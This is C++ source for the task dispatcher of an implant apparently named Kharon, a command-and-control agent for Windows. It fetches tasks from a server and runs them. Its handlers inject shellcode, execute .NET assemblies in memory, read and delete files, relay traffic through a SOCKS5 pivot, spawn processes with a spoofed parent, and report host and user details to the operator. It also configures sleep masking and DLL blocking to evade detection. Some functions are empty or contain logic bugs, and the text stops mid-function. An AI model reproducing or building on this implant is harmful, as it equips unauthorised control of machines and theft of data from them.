#include <Kharon.h>

using namespace Root;

auto DECLFN Task::Dispatcher(
    VOID
) -> VOID {
    PPACKAGE Package  = Self->Pkg->NewTask();
    PPACKAGE PostJobs = Self->Pkg->PostJobs();
    PPARSER  Parser   = (PPARSER)Self->Hp->Alloc( sizeof( PARSER ) );

    ULONG TaskCode = 0;
    INT16 TaskID = 0;
    PCHAR TaskUUID = NULL;
    BYTE JobID = 0;
    BOOL TaskBool = FALSE;
    ULONG TaskQtt = 0;

    PBYTE Buffer = NULL;
    ULONG Length = 0;

    PVOID DataPsr = NULL;
    UINT64 PsrLen = 0;

    KhDbg( "send %p [%d bytes]", Package->Buffer, Package->Length );

    Self->Pkg->Transmit( Package, &DataPsr, &PsrLen );
    KhDbg( "transmited return %p [%d bytes]", DataPsr, PsrLen );
    if ( !DataPsr || !PsrLen ) goto _KH_END;

    Self->Psr->NewTask( Parser, DataPsr, PsrLen );
    if (!Parser->Original) goto _KH_END;

    KhDbg( "parsed %p [%d bytes]", Parser->Buffer, Parser->Length );

    JobID = Self->Psr->Byte( Parser );
    KhDbg( "routine id: %d", JobID );

    if ( JobID == KhGetTask ) {
        TaskQtt = Self->Psr->Int32( Parser );
        KhDbg("task quantity: %d", TaskQtt );

        if ( !TaskQtt ) return;

        Self->Pkg->Int32( PostJobs, TaskQtt );

        for ( INT i = 0; i < TaskQtt; i++ ) {
            TaskUUID = Self->Psr->Str( Parser, 0 );

            KhDbg( "creating job with task uuid: %s", TaskUUID );

            PJOBS NewJob = Self->Jbs->Create( TaskUUID, Parser );
            if ( !NewJob ) {
                KhDbg( "Failed to create job for task %d", TaskID );
                continue;
            }
        }

        Self->Jbs->ExecuteAll();
        Self->Jbs->Send( PostJobs );
        Self->Jbs->Cleanup();
    }

_KH_END:
    if ( Parser && !Self->Jbs->Count ) { 
        Self->Psr->Destroy( Parser );
    }

    if ( Self->Pkg->Global ) {
        Self->Pkg->Destroy( Self->Pkg->Global );
        Self->Pkg->Global = NULL;
    }
}

auto DECLFN Task::Injection(
    _In_ PJOBS Job
) -> ERROR_CODE {
    PPACKAGE Package = Job->Pkg;
    PPARSER  Parser  = Job->Psr;

    ULONG    Type    = Self->Psr->Int32( Parser );
    ULONG    BuffLen = 0;
    ULONG    ArgLen  = 0;
    PBYTE    Buffer  = Self->Psr->Bytes( Parser, &BuffLen );
    PBYTE    Args    = Self->Psr->Bytes( Parser, &ArgLen );
    BOOL     Success = FALSE; 

    if ( Type == KH_INJECTION_SC ) {
        Self->Inj->Shellcode( Buffer, BuffLen );
    } else if ( Type == KH_INJECTION_PE ) {
        return KH_ERROR_INVALID_INJECTION_ID;
    } 

    if ( GLOBAL_PKG ) GLOBAL_PKG = NULL;
}

auto DECLFN Task::Download(
    _In_ PJOBS Job
) -> ERROR_CODE {
}

auto DECLFN Task::Upload(
    _In_ PJOBS Job
) -> ERROR_CODE {
    Job->State = KH_JOB_RUNNING;

//     PPACKAGE Package  = NULL;
//     PPARSER  UpParser = (PPARSER)Self->Hp->Alloc( sizeof( PARSER ) );
//     BOOL     Success  = FALSE;    

//     ULONG  UUIDLen = 0;
//     PVOID  Data    = { 0 };
//     SIZE_T Length  = 0;

//     HANDLE FileHandle = INVALID_HANDLE_VALUE;

//     PBYTE FileBuffer = B_PTR( Self->Hp->Alloc( KH_CHUNK_SIZE ) );
//     ULONG FileLength = 0;
//     PBYTE TmpBuffer  = { 0 };
//     ULONG TmpLength  = 0;
//     ULONG AvalBytes  = 0;

//     Self->Pkg->UUID         = Self->Psr->Str( Parser, &Self->Pkg->UUIDl );
//     Self->Tsp->Tf.Up.FileID = Self->Psr->Str( Parser, 0 );
//     Self->Tsp->Tf.Up.Path   = Self->Psr->Str( Parser, 0 );

//     if ( !Self->Tsp->Tf.Up.Path ) {
//         Self->Tsp->Tf.Up.Path = ".";
//     }

//     KhDbg( "uploading file at path %s with id: %s", Self->Tsp->Tf.Up.Path, Self->Tsp->Tf.Up.FileID );

//     Self->Tsp->Tf.Up.CurChunk = 1;

//     do {
//         Package = Self->Pkg->Create( TkUpload, Parser );

//         Self->Pkg->Int32( Package, Self->Tsp->Tf.Up.CurChunk );
//         Self->Pkg->Str( Package, Self->Tsp->Tf.Up.FileID );
//         Self->Pkg->Str( Package, Self->Tsp->Tf.Up.Path );
//         Self->Pkg->Int32( Package, Self->Tsp->Tf.Up.ChunkSize );

//         KhDbg( "sending..." )
//         KhDbg( "current chunk: %d", Self->Tsp->Tf.Up.CurChunk );
//         KhDbg( "file id      : %s", Self->Tsp->Tf.Up.FileID );
//         KhDbg( "path         : %s", Self->Tsp->Tf.Up.Path );
//         KhDbg( "chunk size   : %d", Self->Tsp->Tf.Up.ChunkSize );

//         Self->Pkg->Transmit( Package, &Data, &Length );
//         KhDbg( "receiving..." )
//         Self->Psr->New( UpParser, Data, Length );
    
//         KhDbg( "receiving..." )
//         Success = Self->Psr->Int32( UpParser );
//         if ( !Success ) {
//             KhDbg( "received fail in the chunk: %d", Self->Tsp->Tf.Up.CurChunk );
//         }

//         KhDbg( "request with: %s %d", Success ? "success" : "failure", Success );
    
//         KhDbg( "receiving..." )

//         Self->Tsp->Tf.Up.FileID      = Self->Psr->Str( UpParser, &Self->Pkg->UUIDl );
//         KhDbg( "file id      : %s", Self->Tsp->Tf.Up.FileID );
//         Self->Tsp->Tf.Up.TotalChunks = Self->Psr->Int32( UpParser );
//         KhDbg( "receiving..." )
//         Self->Tsp->Tf.Up.CurChunk    = Self->Psr->Int32( UpParser );
    
//         KhDbg( "receiving..." )
//         KhDbg( "current chunk: %d", Self->Tsp->Tf.Up.CurChunk );
//         KhDbg( "file id      : %s", Self->Tsp->Tf.Up.FileID );
//         KhDbg( "path         : %s", Self->Tsp->Tf.Up.Path );

//         TmpBuffer = Self->Psr->Bytes( UpParser, &TmpLength );
//         if ( !FileBuffer ) {
//             KhDbg( "fail to get chunk file data" );
//         }

//         if ( !TmpLength ) break;

//         if ( FileLength + TmpLength > AvalBytes ) {
//             AvalBytes = FileLength + TmpLength;

//             FileBuffer = B_PTR( Self->Hp->ReAlloc( FileBuffer, AvalBytes ) );
//         }

//         Mem::Copy( C_PTR( U_PTR( FileBuffer ) + AvalBytes ), TmpBuffer, TmpLength );

//         FileLength += TmpLength;
//         Self->Tsp->Tf.Up.CurChunk++;

//         KhDbg( "received [%d bytes] at %p", FileBuffer, FileLength );

//         Self->Psr->Destroy( UpParser );

//         KhDbg(  )

//     } while ( Self->Tsp->Tf.Up.CurChunk <= Self->Tsp->Tf.Up.TotalChunks );

//     FileHandle = Self->Krnl32.CreateFileA(
//         Self->Tsp->Tf.Up.Path, GENERIC_ALL, FILE_SHARE_READ, 
//         0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0 
//     );
//     if ( !FileHandle || FileHandle == INVALID_HANDLE_VALUE ) goto _KH_END;

//     if ( !( Self->Krnl32.WriteFile( FileHandle, FileBuffer, FileLength, &TmpLength, 0 ) ) ) {
//         KhDbg( "fail in write file operation" );
//     }

//     KhDbg( 
//         "full uploaded with success. file at %p [%d bytes] with chunks: %d", 
//         FileBuffer, FileLength, Self->Tsp->Tf.Up.CurChunk -1 
//     );

// _KH_END:
//     if ( FileBuffer ) Self->Hp->Free( FileBuffer, FileLength );
//     if ( Package    ) Self->Pkg->Destroy( Package  );
//     if ( UpParser   ) Self->Psr->Destroy( UpParser );

//     return KhGetError;
}

auto DECLFN Task::FileSystem(
    _In_ PJOBS Job
) -> ERROR_CODE {
    PPACKAGE Package = Job->Pkg;
    PPARSER  Parser  = Job->Psr;

    UINT8    SbCommandID  = Self->Psr->Byte( Parser );

    ULONG    TmpVal  = 0;
    BOOL     Success = TRUE;
    PBYTE    Buffer  = { 0 };

    KhDbg( "sub command id: %d", SbCommandID );

    Self->Pkg->Byte( Package, SbCommandID );
    
    switch ( SbCommandID ) {
        case SbFsList: {
            WIN32_FIND_DATAA FindData     = { 0 };
            SYSTEMTIME       CreationTime = { 0 };
            SYSTEMTIME       AccessTime   = { 0 };
            SYSTEMTIME       WriteTime    = { 0 };

            HANDLE FileHandle = NULL;
            ULONG  FileSize   = 0;
            PCHAR  TargetDir  = Self->Psr->Str( Parser, &TmpVal );
            HANDLE FindHandle = Self->Krnl32.FindFirstFileA( TargetDir, &FindData );

            if ( FindHandle == INVALID_HANDLE_VALUE || !FindHandle ) break;
        
            do {
                FileHandle = Self->Krnl32.CreateFileA( FindData.cFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
                FileSize   = Self->Krnl32.GetFileSize( FileHandle, 0 );
                
                Self->Ntdll.NtClose( FileHandle );

                Self->Pkg->Str( Package, FindData.cFileName );

                Self->Pkg->Int32( Package, FileSize );

                Self->Pkg->Int32( Package, FindData.dwFileAttributes );
        
                Self->Krnl32.FileTimeToSystemTime( &FindData.ftCreationTime, &CreationTime );

                Self->Pkg->Int16( Package, CreationTime.wDay    );
                Self->Pkg->Int16( Package, CreationTime.wMonth  );
                Self->Pkg->Int16( Package, CreationTime.wYear   );
                Self->Pkg->Int16( Package, CreationTime.wHour   );
                Self->Pkg->Int16( Package, CreationTime.wMinute );
                Self->Pkg->Int16( Package, CreationTime.wSecond );
                    
                Self->Krnl32.FileTimeToSystemTime( &FindData.ftLastAccessTime, &AccessTime );

                Self->Pkg->Int16( Package, AccessTime.wDay    );
                Self->Pkg->Int16( Package, AccessTime.wMonth  );
                Self->Pkg->Int16( Package, AccessTime.wYear   );
                Self->Pkg->Int16( Package, AccessTime.wHour   );
                Self->Pkg->Int16( Package, AccessTime.wMinute );
                Self->Pkg->Int16( Package, AccessTime.wSecond );
                    
                Self->Krnl32.FileTimeToSystemTime( &FindData.ftLastWriteTime, &WriteTime );

                Self->Pkg->Int16( Package, WriteTime.wDay    );
                Self->Pkg->Int16( Package, WriteTime.wMonth  );
                Self->Pkg->Int16( Package, WriteTime.wYear   );
                Self->Pkg->Int16( Package, WriteTime.wHour   );
                Self->Pkg->Int16( Package, WriteTime.wMinute );
                Self->Pkg->Int16( Package, WriteTime.wSecond );
        
            } while ( Self->Krnl32.FindNextFileA( FindHandle, &FindData ));
        
            Success = Self->Krnl32.FindClose( FindHandle );

            break;
        }
        case SbFsCwd: {
            CHAR CurDir[MAX_PATH] = { 0 };

            Self->Krnl32.GetCurrentDirectoryA( sizeof( CurDir ), CurDir ); 

            Self->Pkg->Str( Package, CurDir );

            break;
        }
        case SbFsMove: {
            PCHAR SrcFile = Self->Psr->Str( Parser, &TmpVal );
            PCHAR DstFile = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.MoveFileA( SrcFile, DstFile ); 

            break;
        }
        case SbFsCopy: {
            PCHAR SrcFile = Self->Psr->Str( Parser, &TmpVal );
            PCHAR DstFile = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.CopyFileA( SrcFile, DstFile, TRUE );

            break;
        }
        case SbFsMakeDir: {
            PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.CreateDirectoryA( PathName, NULL );
            
            break;
        }
        case SbFsDelete: {
            PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.DeleteFileA( PathName );

            break;
        }
        case SbFsChangeDir: {
            PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.SetCurrentDirectoryA( PathName );

            break;
        }
        case SbFsRead: {
            PCHAR  PathName   = Self->Psr->Str( Parser, 0 );
            ULONG  FileSize   = 0;
            PBYTE  FileBuffer = { 0 };
            HANDLE FileHandle = Self->Krnl32.CreateFileA( PathName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

            FileSize   = Self->Krnl32.GetFileSize( FileHandle, 0 );
            FileBuffer = B_PTR( Self->Hp->Alloc( FileSize ) );

            Success = Self->Krnl32.ReadFile( FileHandle, FileBuffer, FileSize, &TmpVal, 0 );

            Buffer = FileBuffer;
            TmpVal = FileSize; 

            Self->Pkg->Bytes( Package, Buffer, TmpVal );

            break;
        }
    }

_KH_END:
    if ( !Success ) { return KhGetError; }
    if ( SbCommandID != SbFsList || SbCommandID != SbFsRead || SbCommandID != SbFsCwd ) {
        Self->Pkg->Int32( Package, Success );
    }

    if ( Buffer ) { Self->Hp->Free( Buffer, TmpVal ); }

    return KhRetSuccess;
}

auto DECLFN Task::SelfDelete(
    _In_ PJOBS Job
) -> ERROR_CODE {
    
}

auto DECLFN Task::Dotnet(
    _In_ PJOBS Job
) -> ERROR_CODE {
    PPACKAGE Package = Job->Pkg;
    PPARSER  Parser  = Job->Psr;

    UINT8      SbCommandID = Self->Psr->Byte( Parser );
    ERROR_CODE Code = ERROR_SUCCESS;

    KhDbg( "sub command id: %d", SbCommandID );

    switch ( SbCommandID ) {
        case SbDotInline: {
            PCHAR cArguments  = Self->Psr->Str( Parser, 0 );
            PCHAR cAppDomName = Self->Psr->Str( Parser, 0 );
            BOOL  KeepLoad    = Self->Psr->Int32( Parser );
            PCHAR cVersion    = Self->Psr->Str( Parser, 0 );
            ULONG AsmSize     = 0;
            PBYTE AsmBytes    = Self->Psr->Bytes( Parser, &AsmSize );

            WCHAR wArguments[Str::LengthA( cArguments ) * sizeof( WCHAR )];
            WCHAR wVersion[Str::LengthA( cVersion ) * sizeof( WCHAR )];
            WCHAR wAppDomName[Str::LengthA( cAppDomName ) * sizeof( WCHAR )];

            cArguments = cArguments[0] ? cArguments : NULL;

            Str::CharToWChar( wArguments, cArguments, sizeof( wArguments ) );
            Str::CharToWChar( wVersion, cVersion, sizeof( wVersion ) );
            Str::CharToWChar( wAppDomName, cAppDomName, sizeof( wAppDomName ) );

            Code = Self->Dot->Inline( 
                AsmBytes, AsmSize, wArguments, wAppDomName, wVersion, KeepLoad 
            );

            if ( Self->Dot->Buffer.a && Self->Dot->Buffer.s ) {
                Self->Pkg->Bytes( Package, (PUCHAR)Self->Dot->Buffer.a, Self->Dot->Buffer.s );
            }
            
            break;
        }
        case SbDotList: {
            break;
        }
        case SbDotInvoke: {
            break;
       }
    }   

_KH_END:
    if ( Self->Dot->Buffer.a ) {
        Self->Hp->Free( Self->Dot->Buffer.a, Self->Dot->Buffer.s );
    }

    return Code;
}

unsigned int DECLFN base64_decode(const char* input, unsigned char* output, unsigned int output_size);

auto DECLFN Task::Socks(
    _In_ PJOBS Job
) -> ERROR_CODE {
    KhDbg("Starting SOCKS task processing");
    
    PPACKAGE Package = Job->Pkg;
    PPARSER  Parser  = Job->Psr;

    // Basic data extraction
    BOOL  IsExit    = Self->Psr->Int32(Parser);
    ULONG ServerID  = Self->Psr->Int32(Parser);

    ULONG B64DataLen   = 0;
    PBYTE B64Data = { 0 };
    ULONG DataLen = 0;
    PBYTE Data = { 0 };

    if ( !IsExit ) {
        B64Data = Self->Psr->Bytes(Parser, &B64DataLen);
    
        DataLen = Self->Pkg->Base64DecSize( (PCHAR)B64Data );
        Data = (PBYTE)Self->Hp->Alloc( DataLen );
        base64_decode( (PCHAR)B64Data, (PUCHAR)Data, DataLen );
    }

    KhDbg("Received data - ServerID: %u, IsExit: %d, Data %p Len: %u", 
          ServerID, IsExit, Data, DataLen);
        
    PBYTE ResponseData = nullptr;
    ULONG ResponseLen  = 0;
    ERROR_CODE Result  = ERROR_SUCCESS;

    // Determine operation type
    ULONG Operation;
    if (IsExit) {
        Operation = KH_SOCKET_CLOSE;
        KhDbg("Operation: CLOSE connection");
    } else if (Self->Sckt->Exist(ServerID)) {
        Operation = KH_SOCKET_DATA;
        KhDbg("Operation: DATA for existing connection");
    } else {
        Operation = KH_SOCKET_NEW;
        KhDbg("Operation: NEW connection");
    }

    switch (Operation) {
        case KH_SOCKET_NEW: {
            KhDbg("Starting new SOCKS5 connection");

            // 1. Create new socket
            SOCKET newSocket = Self->Ws2_32.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (newSocket == INVALID_SOCKET) {
                DWORD err = KhGetError;
                KhDbg("Failed to create socket: 0x%X", err);
                return err;
            }
            KhDbg("Socket created: %llu", (ULONG64)newSocket);

            // 2. Verify SOCKS5 data
            if (DataLen < 10) {
                KhDbg("Insufficient data for SOCKS5 header");
                Self->Ws2_32.closesocket(newSocket);
                return ERROR_INVALID_DATA;
            }

            // 3. Verify SOCKS5 version (0x05)
            if (Data[0] != 0x05) {
                KhDbg("Invalid SOCKS version: 0x%02X", Data[0]);
                Self->Ws2_32.closesocket(newSocket);
                return ERROR_INVALID_DATA;
            }

            // 4. Extract connection information
            ULONG targetIP = 0;
            USHORT targetPort = 0;
            ULONG headerSize = 0;

            switch (Data[3]) {  // Address type
                case 0x01: { // IPv4
                    if (DataLen < 10) {
                        KhDbg("Incomplete IPv4 data");
                        Self->Ws2_32.closesocket(newSocket);
                        return ERROR_INVALID_DATA;
                    }
                    targetIP = *(ULONG*)(Data + 4);
                    targetPort = *(USHORT*)(Data + 8);
                    headerSize = 10;
                    
                    KhDbg("Connecting to IPv4: %d.%d.%d.%d:%d",
                          Data[4], Data[5], Data[6], Data[7], 
                          (targetPort >> 8) | (targetPort << 8));
                    break;
                }
                
                case 0x03: { // Domain name
                    if (DataLen < 5) {
                        KhDbg("Incomplete domain data");
                        Self->Ws2_32.closesocket(newSocket);
                        return ERROR_INVALID_DATA;
                    }
                    UCHAR domainLen = Data[4];
                    headerSize = 5 + domainLen + 2;
                    
                    if (DataLen < headerSize) {
                        KhDbg("Incomplete domain data (size: %d, expected: %d)",
                              DataLen, headerSize);
                        Self->Ws2_32.closesocket(newSocket);
                        return ERROR_INVALID_DATA;
                    }
                    
                    // DNS resolution not implemented in this example
                    KhDbg("Domain not supported: %.*s", domainLen, Data + 5);
                    Self->Ws2_32.closesocket(newSocket);
                    return ERROR_NOT_SUPPORTED;
                }
                
                case 0x04: { // IPv6
                    KhDbg("IPv6 not supported");
                    Self->Ws2_32.closesocket(newSocket);
                    return ERROR_NOT_SUPPORTED;
                }
                
                default: {
                    KhDbg("Unknown address type: 0x%02X", Data[3]);
                    Self->Ws2_32.closesocket(newSocket);
                    return ERROR_INVALID_DATA;
                }
            }

            // 5. Connect to final destination
            sockaddr_in targetAddr = {0};
            targetAddr.sin_family = AF_INET;
            targetAddr.sin_addr.s_addr = targetIP;
            targetAddr.sin_port = targetPort;

            KhDbg("Connecting to destination...");
            if (Self->Ws2_32.connect(newSocket, (sockaddr*)&targetAddr, sizeof(targetAddr)) == SOCKET_ERROR) {
                DWORD err = KhGetError;
                KhDbg("Connection failed: 0x%X", err);
                Self->Ws2_32.closesocket(newSocket);
                return err;
            }
            KhDbg("Connection established successfully");

            // 6. Prepare SOCKS5 response
            BYTE socksResponse[10] = {0x05, 0x00, 0x00, 0x01, 
                                    0x00, 0x00, 0x00, 0x00, // Fictitious IP
                                    0x00, 0x00}; // Fictitious port
            
            ResponseData = (PBYTE)Self->Hp->Alloc(sizeof(socksResponse));
            if (!ResponseData) {
                KhDbg("Failed to allocate memory for response");
                Self->Ws2_32.closesocket(newSocket);
                return ERROR_OUTOFMEMORY;
            }
            Mem::Copy(ResponseData, socksResponse, sizeof(socksResponse));
            ResponseLen = sizeof(socksResponse);

            // 7. Store socket
            ERROR_CODE err = Self->Sckt->Add(ServerID, newSocket);
            if (err != ERROR_SUCCESS) {
                KhDbg("Failed to store socket: 0x%X", err);
                Self->Hp->Free(ResponseData, ResponseLen);
                Self->Ws2_32.closesocket(newSocket);
                return err;
            }

            // 8. Send additional data (if any)
            if (DataLen > headerSize) {
                KhDbg("Sending %d bytes of additional data", DataLen - headerSize);
                int bytesSent = Self->Ws2_32.send(newSocket, (char*)(Data + headerSize), DataLen - headerSize, 0);
                if (bytesSent == SOCKET_ERROR) {
                    DWORD sendErr = KhGetError;
                    KhDbg("Error sending additional data: 0x%X (continuing)", sendErr);
                    Result = sendErr; // Doesn't fail, just logs the error
                }
            }
            break;
        }

        case KH_SOCKET_DATA: {
            KhDbg("Processing data for existing connection");

            // 1. Get existing socket
            SOCKET activeSocket = Self->Sckt->Get(ServerID);
            if (activeSocket == INVALID_SOCKET) {
                KhDbg("Connection not found for ServerID: %u", ServerID);
                return ERROR_NOT_FOUND;
            }

            // 2. Send received data
            KhDbg("Sending %d bytes of data", DataLen);
            int bytesSent = Self->Ws2_32.send(activeSocket, (char*)Data, DataLen, 0);
            if (bytesSent == SOCKET_ERROR) {
                DWORD err = KhGetError;
                KhDbg("Failed to send data: 0x%X", err);
                return err;
            }

            // 3. Try to receive response (non-blocking)
            BYTE recvBuffer[4096];
            int bytesRead = Self->Ws2_32.recv(activeSocket, (char*)recvBuffer, sizeof(recvBuffer), MSG_PEEK);
            
            if (bytesRead > 0) {
                // If data is available, do the actual read
                bytesRead = Self->Ws2_32.recv(activeSocket, (char*)recvBuffer, sizeof(recvBuffer), 0);
                if (bytesRead > 0) {
                    KhDbg("Received %d bytes of response", bytesRead);
                    ResponseData = (PBYTE)Self->Hp->Alloc(bytesRead);
                    if (!ResponseData) {
                        KhDbg("Failed to allocate memory for response");
                        return ERROR_OUTOFMEMORY;
                    }
                    Mem::Copy(ResponseData, recvBuffer, bytesRead);
                    ResponseLen = bytesRead;
                }
            } else if (bytesRead == 0) {
                KhDbg("Connection closed by remote");
            } else if (bytesRead == SOCKET_ERROR) {
                DWORD err = KhGetError;
                if (err != WSAEWOULDBLOCK) {
                    KhDbg("Error receiving data: 0x%X", err);
                }
            }
            break;
        }

        case KH_SOCKET_CLOSE: {
            KhDbg("Closing SOCKS connection");

            SOCKET sockToClose = Self->Sckt->Get(ServerID);
            if (sockToClose != INVALID_SOCKET) {
                KhDbg("Closing socket: %llu", (ULONG64)sockToClose);
                Self->Ws2_32.closesocket(sockToClose);
                Self->Sckt->RmCtx(ServerID);
            } else {
                KhDbg("Socket not found for closing");
            }
            break;
        }

        default: {
            KhDbg("Unknown operation: %u", Operation);
            return ERROR_INVALID_PARAMETER;
        }
    }

    // Package response
    KhDbg("Preparing response - IsExit: %d, ServerID: %u, ResponseLen: %u",
          IsExit, ServerID, ResponseLen);
    
    Self->Pkg->Int32(Package, IsExit);
    Self->Pkg->Int32(Package, ServerID);

    if (ResponseData) {
        Self->Pkg->Bytes(Package, ResponseData, ResponseLen);
        Self->Hp->Free(ResponseData, ResponseLen);
    }

    KhDbg("SOCKS task completed with status: 0x%X", Result);
    return Result;
}

auto DECLFN Task::Info(
    _In_ PJOBS Job
) -> ERROR_CODE {
    PPACKAGE Package = Job->Pkg;

    Self->Pkg->Str( Package, Self->Session.AgentID     );
    Self->Pkg->Int64(  Package, Self->Session.Base.Start  );
    Self->Pkg->Int32(  Package, Self->Session.Base.Length );
    Self->Pkg->Str( Package, Self->Session.ImagePath   );
    Self->Pkg->Str( Package, Self->Session.CommandLine );
    Self->Pkg->Int32(  Package, Self->Session.ProcessID   );
    Self->Pkg->Int32(  Package, Self->Session.ThreadID    );
    Self->Pkg->Int32(  Package, Self->Session.ParentID    );
    Self->Pkg->Int32(  Package, Self->Session.HeapHandle  );
    Self->Pkg->Int32(  Package, Self->Session.SleepTime   );
    Self->Pkg->Int32(  Package, Self->Session.ProcessArch );
    Self->Pkg->Byte(   Package, Self->Session.Elevated    );

    Self->Pkg->Byte(   Package, Self->Mk->Ctx.TechniqueID      );
    Self->Pkg->Byte(   Package, Self->Mk->Ctx.Heap             );
    Self->Pkg->Int64(  Package, Self->Mk->Ctx.JmpGadget        );
    Self->Pkg->Int64(  Package, Self->Mk->Ctx.NtContinueGadget );

    Self->Pkg->Str( Package, Self->Machine.UserName      );
    Self->Pkg->Str( Package, Self->Machine.CompName      );
    Self->Pkg->Str( Package, Self->Machine.DomName       );
    Self->Pkg->Str( Package, Self->Machine.NetBios       );
    Self->Pkg->Int32(  Package, Self->Machine.OsArch        );
    Self->Pkg->Int32(  Package, Self->Machine.OsMjrV        );
    Self->Pkg->Int32(  Package, Self->Machine.OsMnrV        );
    Self->Pkg->Int32(  Package, Self->Machine.OsBuild       );
    Self->Pkg->Int32(  Package, Self->Machine.ProductType   );
    Self->Pkg->Int32(  Package, Self->Machine.TotalRAM      );
    Self->Pkg->Int32(  Package, Self->Machine.AvalRAM       );
    Self->Pkg->Int32(  Package, Self->Machine.UsedRAM       );
    Self->Pkg->Int32(  Package, Self->Machine.PercentRAM    );
    Self->Pkg->Str( Package, Self->Machine.ProcessorName );
    Self->Pkg->Int32(  Package, Self->Machine.ProcessorsNbr );
    
    KhRetSuccess;
}

auto DECLFN Task::Config(
    _In_ PJOBS Job
) -> ERROR_CODE {
    PPACKAGE Package = Job->Pkg;
    PPARSER  Parser  = Job->Psr;

    UINT8    SbCommandID = Self->Psr->Byte( Parser );
    ULONG    TmpVal      = 0;
    BOOL     Success     = FALSE;

    KhDbg( "sub command id: %d", SbCommandID );

    switch ( SbCommandID ) {
        case SbCfgPpid: {
            ULONG ParentID = Self->Psr->Int32( Parser );
            Self->Ps->Ctx.ParentID = ParentID;

            KhDbg( "parent id set to %d", Self->Ps->Ctx.ParentID ); break;
        }
        case SbCfgSleep: {
            ULONG NewSleep = Self->Psr->Int32( Parser );
            Self->Session.SleepTime = NewSleep * 1000;

            KhDbg( "new sleep time set to %d", Self->Session.SleepTime % 1000 ); break;
        }
        case SbCfgJitter: {
            ULONG NewJitter = Self->Psr->Int32( Parser );
            Self->Session.Jitter = NewJitter;

            KhDbg( "new jitter set to %d", Self->Session.Jitter ); break;
        }
        case SbCfgBlockDlls: {
            BOOL BlockDlls  = Self->Psr->Int32( Parser );
            Self->Ps->Ctx.BlockDlls = BlockDlls;
            
            KhDbg( "block non microsoft dlls is %s", Self->Ps->Ctx.BlockDlls ? "enabled" : "disabled" ); break;
        }
        case SbCfgCurDir: {
            if ( Self->Ps->Ctx.CurrentDir ) {
                Self->Hp->Free( Self->Ps->Ctx.CurrentDir, Str::LengthA( Self->Ps->Ctx.CurrentDir ) );
            }

            PCHAR CurDirTmp  = Self->Psr->Str( Parser, &TmpVal );
            PCHAR CurrentDir = (PCHAR)Self->Hp->Alloc( TmpVal );

            Mem::Copy( CurrentDir, CurDirTmp, TmpVal );

            Self->Ps->Ctx.CurrentDir = CurrentDir; break;
        }
        case SbCfgMask: {
            INT32 TechniqueID = Self->Psr->Int32( Parser );
            if ( 
                TechniqueID != MaskTimer || 
                TechniqueID != MaskApc   || 
                TechniqueID != MaskWait 
            ) {
                KhDbg( "invalid mask id: %d", TechniqueID );
                return KH_ERROR_INVALID_MASK_ID;
            }
        
            Self->Mk->Ctx.TechniqueID = TechniqueID;
        
            KhDbg( 
                "mask technique id set to %d (%s)", Self->Mk->Ctx.TechniqueID, 
                  Self->Mk->Ctx.TechniqueID == MaskTimer ? "timer" : 
                ( Self->Mk->Ctx.TechniqueID == MaskApc   ? "apc" : 
                ( Self->Mk->Ctx.TechniqueID == MaskWait  ? "wait" : "unknown" ) )
            );
        }
        case sbCfgSpawn: {
            // PCHAR Spawn = Self->InjCtx.;
        }
    }

    return KhRetSuccess;
}

auto DECLFN Task::Process(
    _In_ PJOBS Job
) -> ERROR_CODE {
    PPACKAGE Package     = Job->Pkg;
    PPARSER  Parser      = Job->Psr;
    UINT8    SbCommandID = Self->Psr->Byte( Parser );
    ULONG    TmpVal      = 0;
    BOOL     Success     = FALSE;

    KhDbg( "sub command id: %d", SbCommandID );

    Self->Pkg->Byte( Package, SbCommandID );

    switch ( SbCommandID ) {
        case SbPsCreate: {
            GLOBAL_PKG = Package;

            PCHAR               CommandLine = Self->Psr->Str( Parser, &TmpVal );
            PROCESS_INFORMATION PsInfo      = { 0 };

            Success = Self->Ps->Create( CommandLine, CREATE_NO_WINDOW, &PsInfo );
            if ( !Success ) return KhGetError;

            Self->Pkg->Int32( Package, PsInfo.dwProcessId );
            Self->Pkg->Int32( Package, PsInfo.dwThreadId  );
            
            break;
        }
        case SbPsList: {
            PVOID ValToFree = NULL;
            ULONG ReturnLen = 0;
            ULONG Status    = STATUS_SUCCESS;
            BOOL  Isx64     = FALSE;
            PCHAR UserToken = { 0 };
            ULONG UserLen   = 0;

            HANDLE TokenHandle   = INVALID_HANDLE_VALUE;
            HANDLE ProcessHandle = INVALID_HANDLE_VALUE;

            FILETIME   FileTime   = { 0 };
            SYSTEMTIME CreateTime = { 0 };

            PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
            PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };

            Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, 0, 0, &ReturnLen );

            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)Self->Hp->Alloc( ReturnLen );
            if ( !SysProcInfo ) {}
            
            Status = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
            if ( Status != STATUS_SUCCESS ) {}

            ValToFree = SysProcInfo;

            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );

            do {
                if ( !SysProcInfo->ImageName.Buffer ) {
                    Self->Pkg->Wstr( Package, L"-" );
                } else {
                    Self->Pkg->Wstr( Package, SysProcInfo->ImageName.Buffer );
                }
                
                Self->Pkg->Int32( Package, HandleToUlong( SysProcInfo->UniqueProcessId ) );
                Self->Pkg->Int32( Package, HandleToUlong( SysProcInfo->InheritedFromUniqueProcessId ) );
                Self->Pkg->Int32( Package, SysProcInfo->HandleCount );
                Self->Pkg->Int32( Package, SysProcInfo->SessionId );
                
                Self->Pkg->Int32( Package, SysProcInfo->NumberOfThreads );
            
                ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION, FALSE, HandleToUlong( SysProcInfo->UniqueProcessId ) );
                
